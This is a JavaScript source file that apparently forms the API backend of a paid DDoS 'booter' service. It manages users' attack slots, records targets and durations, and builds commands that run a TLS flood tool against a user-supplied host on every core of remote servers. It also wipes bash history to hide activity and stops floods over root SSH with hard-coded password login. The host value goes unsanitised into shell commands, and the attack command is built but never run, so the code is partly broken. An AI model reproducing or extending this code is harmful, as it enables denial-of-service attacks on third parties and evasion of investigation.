require('../db');
const { model } = require('mongoose');
const Servers = require('../catalogs/CatalogAttack.js');
const { Product, Logs } = require('../catalogs/CatalogUser');
const ServersLists = require('../catalogs/Servers.js');
var crypto = require("crypto");
const { exec } = require("child_process");
const url = require('url');

/**
 * 
 * @Compose @Load
 * 
 */

 function RandomId(){
    var id = crypto.randomBytes(8).toString('hex');
    return id
}

async function ValidSlotsServer(name){
    const result = await Servers.find({serverName: name, Running: true})
    const corsSearch = await ServersLists.find({Running: true, nameServer: name});

    var convert22 = JSON.stringify(result);
    var ParseJson22 = JSON.parse(convert22);

    var convert223 = JSON.stringify(corsSearch);
    var ParseJson224 = JSON.parse(convert223);

    let TotalsAttacks = [];
    let core2s = [];

    ParseJson224.forEach(async(obj) => {
        core2s.push(obj.cores)
    })

    ParseJson22.forEach(async(obj) => {
        if (Date.now() < obj.expire+obj.timeAttack*1000){
            TotalsAttacks.push(obj);
        }
    });

    return `${TotalsAttacks.length}:${core2s}#${name}`
}

 async function LoadServersLising(serversNameess){
    try {

        return await new Promise((resolve, reject) => {
        serversNameess.forEach(async(NameServer) => {
            let Res = await ValidSlotsServer(NameServer);
            if (Number(Res.split(':')[0]) < Res.split('#')[0].split(':')[1]){
                resolve(NameServer)
            }
        });

    }).then((successMessage) => {
        return successMessage
    });

    } catch (error){
        return undefined
    }
}


async function LoadServersLising2(){
    try {

        const Serversss = await ServersLists.find({Running: true})

        var convert1 = JSON.stringify(Serversss);

        var ParseJson = JSON.parse(convert1);

        let ListingServers = [];
        let ServersName = [];
    
        ParseJson.forEach(async(obj) => {
                ServersName.push(obj)
        });

        return ServersName

    } catch (error){
        console.log(err)
        return 0
    }
}


async function FoundNameServer(){
    try {

        const Serversss = await ServersLists.find({Running: true})

        var convert1 = JSON.stringify(Serversss);

        var ParseJson = JSON.parse(convert1);

        let ServersName = [];
    
        ParseJson.forEach(async(obj) => {
            if (ServersName.indexOf(obj.nameServer) == -1){
                ServersName.push(obj.nameServer)
            }
        });

        return ServersName

    } catch (error){
        console.log(err)
        return 0
    }
}

async function LoadSLotsAvalid(Key){
    try {

        const result = await Servers.find({idUser: Key, Running: true})
        var convert1 = JSON.stringify(result);
        var ParseJson = JSON.parse(convert1);
        string = 0;
    
        ParseJson.forEach(async(obj) => {
            if (Date.now() < obj.expire+obj.timeAttack*1000){
             string += 1;
            }
        });

        return string

    } catch (error){
        console.log(err)
        return 0
    }
}

class LoadEvents {
    constructor(){
    }

    async LoadSLotsAvalid(Key){
        try {
    
            const result = await Servers.find({idUser: Key, Running: true})
            var convert1 = JSON.stringify(result);
            var ParseJson = JSON.parse(convert1);
            string = 0;
        
            ParseJson.forEach(async(obj) => {
                if (Date.now() < obj.expire+obj.timeAttack*1000 & obj.Running == true){
                 string += 1;
                }
            });
    
            return string
    
        } catch (error){
            console.log(err)
            return 0
        }
    }

async LoadUser(Key, Ob){
    try {

        const result = await Product.find({key: Key, Used: true})
        var convert1 = JSON.stringify(result);
        var ParseJson = JSON.parse(convert1);
        let string = ''
    
        ParseJson.forEach(async(obj) => {
             string = obj[Ob];  
        });

        return string

    } catch (error){
        return error
    }
}

    Write(res, text, statusRes){
        res.json({
            result: text,
            status: statusRes
        });
        return
    }

     WriteAttack(res, text, statusRes, host, time, method, thread, mode){
        res.json({
            result: text,
            host: host,
            time: time,
            mode: mode,
            thread: 1,
            method: method,
            status: statusRes
        });
        return
    }

    Stoped(res, text, statusRes, host){
        res.json({
            result: text,
            host: host,
            method: 'STOP',
            status: statusRes
        });
        return
    }

    async infoUser(res, key, conc, time){
        await res.json({
            key: key,
            Concurents: conc,
            MaxBotTime: time,
            Network: 'Premium',
            Status: 'Enabled'
        });
        return
    }

    Alert(){
        console.log('API By Ivalid.Rip Team & v1');
    }

    Xss(typ){
        if (typ == 'host'){
            return "[{, } , {}, `, ``, ', '', < , > , <> , ( , ) , ~]"
        } else 
        if (typ == 'time'){
            return "[{(.*), (.*)}, `, `` , {(.*)}, !, ', '' , % , < , > , <> , ( , ) ,^, </ , \ , ( , ) , \n , ~ ,\r , &quot , %lt]"
        } else 
        if (typ == 'key'){
            return "[{(.*), (.*)}, `, `` , {(.*)}, !, ', '' , % , < , > , <> , ( , )  ,^, </, \, ( , ) , \n , ~ ,\r , &quot , %lt]"
        } else 
        if (typ == 'method'){
            return "[{(.*), (.*)}, `, `` , {(.*)}, !, ', '' , % , < , > , <> , ( , ) , 0x ,^, </, \, ( , ) , \n , ~ ,\r , &quot , %lt]"
        } else 
        if (typ == 'thread'){
            return "[{(.*), (.*)}, `, `` , {(.*)}, !, ', '' , % , < , > , <> , ( , ) ,^, </ , \ , ( , ) , \n , ~ ,\r , &quot , %lt]"
        } else 
        if (typ == 'STOP'){
            return "[{(.*), (.*)}, `, `` , {(.*)}, !, ', '' , % , < , > , <> , ( , )  ,^, </, \, ( , ) , \n , ~ ,\r , &quot , %lt]"
        } else {
            return 0
        }
    }

    async BanUser(key){
        try {
        await Logs.updateOne({ key: key }, {
            Used: false
          });
    } catch(error){}
}
}

class ConfigAttacker {
constructor(){
    this.Ev = new LoadEvents();
}

async StopAttack(key, host, id){
}
}

async function LoadAttack(res, key, host, time, method, thread, mode){
    let LoadUser123213 = new LoadEvents();
    let Slots = await LoadSLotsAvalid(key);
    let SlotsPLan = 250; //await LoadUser123213.LoadUser('1fff72d8eb992dc13106e83acc4bbdc40f449b0344aafb58', 'concurents');
    let LoadServersL = await FoundNameServer();
    let ConcThr = SlotsPLan-Slots;

    if (ConcThr < thread){
        LoadUser123213.Write(res, 'You have exceeded the maximum of concurents, try to return in a few minutes again.', 'error');
        return
    }
    
    if (Slots < SlotsPLan && Slots == SlotsPLan){

    } else {

    let ServersList = await LoadServersLising(LoadServersL);
    let Serverrr = await LoadServersLising2();

    if (ServersList !== null && ServersList !== 0){
        Serverrr.forEach(async (dates) => {
        ComandAttackList = `"ulimit; `;
        ComandAttackList += `cat /dev/null > ~/.bash_history && history -c"`;

            if (dates.nameServer == ServersList){

                const DataAttack = new Servers({
                    timeAttack: time,
                    methodName: method,
                    expire: Date.now(),
                    cores: dates.cores,
                    target: host,
                    Running: true,
                    serverName: dates.nameServer,
                    idUser: key,
                    idAttack: RandomId()
                });
                await DataAttack.save();
        
            let ComandExecutation = `cat /dev/null > ~/.bash_history && history -c; cat /dev/null > ~/.bash_history && history -c` ;
            exec(ComandExecutation, (error) => {if (error) {return}});

            }

        });

    } else {
        LoadUser123213.Write(res, 'Fail to send attack, Contact admin.', 'error');
    }
        
    LoadUser123213.WriteAttack(res, `attack sent successfully to ${host} for ${time}`, "successful", host, time, method, 1, mode);
    //LoadUser123213.Write(res, 'Under Mantein', 'error');
    res.end();
    return
    }
}

async function FullN(res, key, host, time, method, thread, mode){
    let LoadUser123213 = new LoadEvents();
    let Slots = await LoadSLotsAvalid(key);
    let SlotsPLan = 1;
    let LoadServersL = await FoundNameServer();
    let ConcThr = SlotsPLan-Slots;

    console.log(ConcThr , Slots)

    if (ConcThr < thread){
        LoadUser123213.Write(res, 'You have exceeded the maximum of concurents, try to return in a few minutes again.', 'error');
        return
    }

    if (thread < 1){
        LoadUser123213.Write(res, 'You have exceeded the maximum of threads.', 'error');
        return
    }
    
    if (Slots < SlotsPLan && Slots == SlotsPLan){

    } else {

    let ServersList = await LoadServersLising(LoadServersL);
    let Serverrr = await LoadServersLising2();

    if (ServersList !== null && ServersList !== 0){
        Serverrr.forEach(async (dates) => {
        ComandAttackList = `"ulimit;cat /dev/null > ~/.bash_history && history -c; `;
        var CoresCalculator = (100 / 100) * dates.cores;

        for (let j = 0; j < CoresCalculator; j++) {
    
            if (ComandAttackList.split('|').length == CoresCalculator){
                ComandAttackList += `../tmp/TlsNodejs2 ${host} ${Number(time)} ${mode}`;
            } else {
                ComandAttackList += `../tmp/TlsNodejs2 ${host} ${Number(time)} ${mode}|`;
            }
            }
        ComandAttackList += `"`;

                const DataAttack = new Servers({
                    timeAttack: time,
                    methodName: method,
                    expire: Date.now(),
                    cores: dates.cores,
                    target: host,
                    Running: true,
                    serverName: dates.nameServer,
                    idUser: key,
                    idAttack: RandomId()
                });
                await DataAttack.save();
        
            let ComandExecutation = `cat /dev/null > ~/.bash_history && history -c; cat /dev/null > ~/.bash_history && history -c` ;

            exec(ComandExecutation, (error) => {if (error) {return}});
        });

        LoadUser123213.WriteAttack(res, `attack sent successfully to ${host} for ${time} (FULL POWERPROOF)`, "successful", host, time, method, 1, mode);
        res.end();
        return

    } else {
        LoadUser123213.Write(res, 'Fail to send attack, Contact admin.', 'error');
    }
}
}

async function StopAttack(res, host, Key){
    let LoadUser123213 = new LoadEvents();
    let Serverrr = await LoadServersLising2();

    await Servers.updateMany({ idUser: Key, target: host }, {
        Running: false
      });

    Serverrr.forEach(async (dates) => {
        let ComandExecutation = `sshpass -p ${dates.password} ssh -o StrictHostKeyChecking=no root@${dates.ip} "pkill ${host} -f; pkill ${url.parse(host).host} -f"`;
        
        exec(ComandExecutation, (error) => {if (error) {return}});

        LoadUser123213.Stoped(res, `attack to ${url.parse(host).host} stopped successfully.`, "successful", url.parse(host).host);
    });
}


module.exports = {
    LoadEvents: LoadEvents,
    ConfigAttacker: ConfigAttacker,
    stopAttacks: StopAttack,
    fullNetwork: FullN,
    LoadAttack2: LoadAttack
}
